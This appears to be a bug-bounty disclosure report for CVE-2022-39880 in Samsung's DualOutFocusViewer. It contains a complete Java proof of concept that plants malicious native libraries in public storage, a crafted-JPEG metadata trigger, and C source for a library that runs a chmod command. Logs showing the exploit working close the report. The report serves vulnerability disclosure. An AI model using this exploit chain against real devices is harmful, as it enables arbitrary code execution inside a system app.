# Details

<table>
    <tr>
        <td>Name</td>
        <td>DualOutFocusViewer</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.dofviewer</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.26</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39880">CVE-2022-39880</a> (SVE-2022-0746)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$3240</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/015.%20DualOutFocusViewer%20—%20Arbitrary%20code%20execution/Oversecured_report.png)

Oversecured found that under certain conditions, the app copies native library files from the public directory to the internal directory and then loads them using `System.load()`.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    createPayloads();

    Intent i = new Intent("com.samsung.android.app.dofviewer");
    i.putExtra("IMAGE_FILE_PATH", writeImageFile().getAbsolutePath());
    startActivity(i);
}

private File writeImageFile() {
    try {
        File outFile = new File("/sdcard/DCIM/Camera/payload.jpg");
        outFile.getParentFile().mkdirs();

        InputStream inputStream = getAssets().open("image.jpg");
        OutputStream outputStream = new FileOutputStream(outFile);
        IOUtils.copy(inputStream, outputStream);
        inputStream.close();
        outputStream.close();

        return outFile;
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private void createPayloads() {
    try {
        File root = new File("/sdcard/DCIM/1000/lib/");
        root.mkdirs();

        // make isLibraryTest() == true
        File libraryTestFile = new File("/sdcard/DCIM/1000/1000.library");
        new FileOutputStream(libraryTestFile).close();

        // write libraries
        String[] files = new String[] {
                "dualcam_refocus_gallery_31_jni",
                "dualcam_refocus_gallery_31",
                "dualcam_refocus_gallery",
                "dualcam_refocus_gallery_jni",
                "dualcam_refocus_gallery_aser",
                "dualcam_refocus_gallery_aser_jni",
                "dualcam_refocus_gallery_beyond",
                "dualcam_refocus_gallery_beyond_jni",
                "dualcam_refocus_gallery_wt_beyond",
                "dualcam_refocus_gallery_wt_beyond_jni",
                "dualcam_refocus_gallery_front_beyond",
                "dualcam_refocus_gallery_front_beyond_jni",
                "dualcam_refocus_gallery_26",
                "dualcam_refocus_gallery_26_jni",
                "dualcam_refocus_gallery_36",
                "dualcam_refocus_gallery_36_jni",
                "dualcam_refocus_gallery_39",
                "dualcam_refocus_gallery_39_jni",
                "dualcam_refocus_gallery_43",
                "dualcam_refocus_gallery_43_jni"
        };
        for (String file : files) {
            File libFile = new File(root, "lib" + file + ".so");
            InputStream inputStream = getAssets().open("libevil.so");
            OutputStream outputStream = new FileOutputStream(libFile);
            IOUtils.copy(inputStream, outputStream);
            inputStream.close();
            outputStream.close();
        }
    } catch (Throwable th) {
        Toast.makeText(this, "Cannot create files. Did you grant SD card permissions?", Toast.LENGTH_LONG).show();
        throw new RuntimeException(th);
    }
}
```

The `libevil.so` library consists of the following code and executes the command `chmod -R 777 /data/user/0/com.samsung.android.app.dofviewer/`:
```cpp
#include <jni.h>
#include <unistd.h>
#include <string.h>
#include <android/log.h>
#include <stdlib.h>

#define TAG "evil"

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    pid_t pid = getpid();
    __android_log_print(ANDROID_LOG_INFO, TAG, "process id %d\n", pid);
    char path[128] = {0};
    sprintf(path, "/proc/%d/cmdline", pid);
    FILE *cmdline = fopen(path, "r");
    char application_id[128] = { 0 };
    fread(application_id, sizeof(application_id), 1, cmdline);
    __android_log_print(ANDROID_LOG_INFO, TAG, "application id %s\n", application_id);
    fclose(cmdline);

    __android_log_print(ANDROID_LOG_INFO, TAG, "Performing code execution...");
    char command[256] = { 0 };
    sprintf(command, "chmod -R 777 /data/user/0/%s/", application_id);
    __android_log_print(ANDROID_LOG_INFO, TAG, "Command: %s", command);
    system(command);
    return JNI_VERSION_1_6;
}
```

The code to copy and load third-party libraries will be executed if the picture passed in from the outside contains a certain metadata. We have learned how to add it to fit the conditions with the following code:
```java
private void addPayloadToJpeg(File file) {
    byte[] focusShotMetaInfo = getFocusShotMetaInfo();
    try {
        Class semExtendedFormatClass = Class.forName("com.samsung.android.media.SemExtendedFormat");
        Method addDataMethod = semExtendedFormatClass.getDeclaredMethod("addData", File.class, String.class, byte[].class, int.class, int.class);
        addDataMethod.invoke(null, file, "Dual_Relighting_Bokeh_Info", focusShotMetaInfo, 3024, 1);
        addDataMethod.invoke(null, file, "DualShot_DepthMap_1", focusShotMetaInfo, 3024, 1);
        addDataMethod.invoke(null, file, "DualShot_1", focusShotMetaInfo, 3024, 1);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private byte[] getFocusShotMetaInfo() {
    FocusShotMetaInfo info = new FocusShotMetaInfo();
    info.mDofHeader2.mDepthSolutionProvider = 3;
    return info.generateMetadata();
}
```

After running Proof of Concept we got the following logs:
```
03-25 21:24:15.347 18957 18957 I DOFViewerApp: Version DOFV:7.0.80 Test:0.0::app_count:1::app_number:1::engine_number:1::DualBokehEngine.mDOFEngine:null
03-25 21:24:15.391 18957 18957 I DOFViewerApp: InternalPath:/sdcard/DCIM/Camera/payload.jpg::mFilePath:/sdcard/DCIM/Camera/payload.jpg::canWrite:true::canRead:true
03-25 21:24:15.396 18957 18957 I DOFViewerApp: mPortrait:0
03-25 21:24:15.396 18957 18957 I DOFViewerApp: mImageWidth:4032::mImageHeight:3024
03-25 21:24:15.398 18957 18957 I DOFViewerApp: isValidSefFile() ->:canWrite:true:::mFilePath:::/sdcard/DCIM/Camera/payload.jpg::mInternalPath:::/sdcard/DCIM/Camera/payload.jpg
03-25 21:24:15.400 18957 18957 I DOFViewerApp: isValidSefFile() -> isSefFile:true::InternalPath:/sdcard/DCIM/Camera/payload.jpg
03-25 21:24:15.403 18957 18957 I DOFViewerApp: has DUAL_RELIGHT_BOKEH_INFO
03-25 21:24:15.403 18957 18957 I DOFViewerApp: isDualBokeh:true ::isSingleBokeh:false ::isPortrait:false ::isLightingSupport:true
03-25 21:24:15.404 18957 19009 I DOFViewerApp: showProgressIcon()
03-25 21:24:15.404 18957 19009 I DOFV_DualBokehEngine: INITIALIZING SEF..
03-25 21:24:15.405 18957 19009 I DOFV_ParsingSEF: doInBackgroundinitSEFParsing -> keyNames:[Image_UTC_Data, Dual_Relighting_Bokeh_Info, DualShot_DepthMap_1, DualShot_1]:count:4
03-25 21:24:15.405 18957 19009 I DOFV_ParsingSEF: SEF KEY : [Image_UTC_Data, Dual_Relighting_Bokeh_Info, DualShot_DepthMap_1, DualShot_1] & [2561, 3024, 3024, 3024]
03-25 21:24:15.405 18957 19009 I SemExtendedFormat: Initial Parsing Sef 1 ms
03-25 21:24:15.417 18957 19009 I SemExtendedFormat: Final Parsing Sef 13 ms
03-25 21:24:15.417 18957 19009 I DOFV_DualBokehEngine: initSEF Time :: 13
03-25 21:24:15.418 18957 19009 I DOFV_SetEffect: effectmenu:0::ArtBokeh_index:-1::mOriginalEffectPosition:0
03-25 21:24:15.418 18957 19009 I DOFV_SetEffect: disableRefocus:false
03-25 21:24:15.418 18957 19009 I DOFV_DualBokehEngine: PRE_INITIALIZING FOCUS SHOT ENGINE
03-25 21:24:15.419 18957 19009 I DOFV_DOFEngine: info_parsed2.mDepthSolutionProvider:3
03-25 21:24:15.419 18957 19009 I DOFV_DOFEngine: info_parsed2.mDepthCameraType:0
03-25 21:24:15.419 18957 19009 I DOFV_DOFEngine: metadata : 1.0 & Solution3
03-25 21:24:15.419 18957 19009 I DOFV_DOFEngine: beautyMode : 102
03-25 21:24:15.419 18957 19009 I DOFV_DOFEngine: No Core Info
03-25 21:24:15.425 18957 19009 I DOFV_DOFEngine: BufferHandler.init::524632458192
03-25 21:24:15.426 18957 19009 I DOFV_DOFEngine: diw & dih: 0 0
03-25 21:24:15.426 18957 19009 I DOFV_DualBokehEngine: preinitOutFocusEngine:true::isSwitchInput:false
03-25 21:24:15.426 18957 19009 I DOFV_DualBokehEngine: preinitOutFocusEngine Final Parsing Sef 8 ms
03-25 21:24:15.426 18957 19009 I DOFV_DualBokehEngine: INITIALIZING FOCUS SHOT ENGINE
03-25 21:24:15.426 18957 19009 I DOFV_DualBokehEngine: libraryPath:/data/user/0/com.samsung.android.app.dofviewer/cache
03-25 21:24:15.426 18957 19009 I DOFV_DOFEngine: mRefocus init Solution : 3
03-25 21:24:15.427 18957 19009 I DOFV_EngineFactory: loadEngine::dualcam_refocus_gallery_aser&dualcam_refocus_gallery_aser_jni::isTest:true
03-25 21:24:15.446 18957 19009 I DOFV_EngineFactory: mTestLibrary : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser.so
03-25 21:24:15.446 18957 19009 I DOFV_EngineFactory: load : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser.so
03-25 21:24:15.446 18957 19009 I evil     : process id 18957
03-25 21:24:15.446 18957 19009 I evil     : application id com.samsung.android.app.dofviewer
03-25 21:24:15.446 18957 19009 I evil     : Performing code execution...
03-25 21:24:15.446 18957 19009 I evil     : Command: chmod -R 777 /data/user/0/com.samsung.android.app.dofviewer/
03-25 21:24:15.468 18957 19009 I DOFV_EngineFactory: loaded : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser.so
03-25 21:24:15.470 18957 19009 I DOFV_EngineFactory: mTestLibrary : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser_jni.so
03-25 21:24:15.470 18957 19009 I DOFV_EngineFactory: load : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser_jni.so
03-25 21:24:15.470 18957 19009 I evil     : process id 18957
03-25 21:24:15.470 18957 19009 I evil     : application id com.samsung.android.app.dofviewer
03-25 21:24:15.470 18957 19009 I evil     : Performing code execution...
03-25 21:24:15.470 18957 19009 I evil     : Command: chmod -R 777 /data/user/0/com.samsung.android.app.dofviewer/
03-25 21:24:15.494 18957 19009 I DOFV_EngineFactory: loaded : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser_jni.so
03-25 21:24:15.495 18957 19009 I DOFV_EngineFactory: loadEngine::dualcam_refocus_gallery_aser&dualcam_refocus_gallery_aser_jni::isTest:true
03-25 21:24:15.496 18957 19009 I DOFV_EngineFactory: mTestLibrary : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser.so
03-25 21:24:15.496 18957 19009 I DOFV_EngineFactory: load : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser.so
03-25 21:24:15.496 18957 19009 I DOFV_EngineFactory: loaded : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser.so
03-25 21:24:15.498 18957 19009 I DOFV_EngineFactory: mTestLibrary : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser_jni.so
03-25 21:24:15.498 18957 19009 I DOFV_EngineFactory: load : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser_jni.so
03-25 21:24:15.498 18957 19009 I DOFV_EngineFactory: loaded : /data/user/0/com.samsung.android.app.dofviewer/cache/libdualcam_refocus_gallery_aser_jni.so
03-25 21:24:15.498 18957 19009 I DOFV_EngineFactory: loadEngine::dualcam_portraitlighting_gallery_360&arcsoft_dualcam_portraitlighting_360_jni::isTest:true
03-25 21:24:15.515 18957 19009 I DOFV_EngineFactory: useEnginePLighting_360 : true
03-25 21:24:15.515 18957 19009 I DOFV_EngineFactory: use LightingEngine 3
03-25 21:24:15.515 18957 19009 I DOFV_DOFEngine: DecodeJpegBufferToNV21
03-25 21:24:15.515 18957 19009 I DOFV_DOFEngine: previewWidth & previewRatioW :: 0 : NaN
03-25 21:24:15.515 18957 19009 I DOFV_DOFEngine: previewHeight & previewRatioH :: 0 : NaN
```

We also checked with ADB that the code was executed:
![](04%20رئيسية/Samsung%20Vulnerabilities/015.%20DualOutFocusViewer%20—%20Arbitrary%20code%20execution/Result.png)
